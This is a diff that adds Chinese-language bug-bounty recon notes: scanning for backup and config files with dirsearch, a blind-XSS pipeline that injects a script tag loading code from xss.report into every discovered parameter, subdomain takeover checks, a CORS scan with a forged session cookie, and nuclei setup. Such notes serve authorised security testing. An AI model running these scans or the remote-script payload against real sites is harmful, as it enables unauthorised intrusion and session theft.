@@ -191,7 +191,47 @@ python3 SecretFinder.py
 python3 SecretFinder.py -i js.txt -o secret.txt
 ````
 
+> 目录扫描
 
+```shell
+sudo apt install dirsearch
 
+dirsearch  -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+```
 
+> xss漏洞
+
+```shell
+# 工具 qurl & bxss
+go install github.com/repejota/qurl/cmd/qurl@develop
+go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
+
+# subfinder
+subfinder -d example.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aunglat></script>' -parameters
+```
+
+> 子域名检测： subzy [github](https://github.com/PentestPad/subzy)
+
+```shell
+subzy run --targets subdomains.txt --verify_ssl
+```
+
+> CORS 错误配置扫描程序: [github](https://github.com/s0md3v/Corsy)
+
+```shell
+git clone https://github.com/s0md3v/Corsy.git
+
+python3 corsy.py -i /home/goer/hackerone/facebook/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+```
+
+> nuclei: Nuclei 是一款现代的高性能漏洞扫描程序，它利用基于 YAML 的简单模板。 [github](https://github.com/projectdiscovery/nuclei)
+>
+> nuclei-templates: 社区精心挑选的用于核心引擎的模板列表，用于查找应用程序中的安全漏洞。[github](https://github.com/projectdiscovery/nuclei-templates)
+>
+> priv8-Nuclei: 作者的一些模板。 [github](https://github.com/aungsanoo-usa/priv8-Nuclei)
+
+```shell
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+```
 
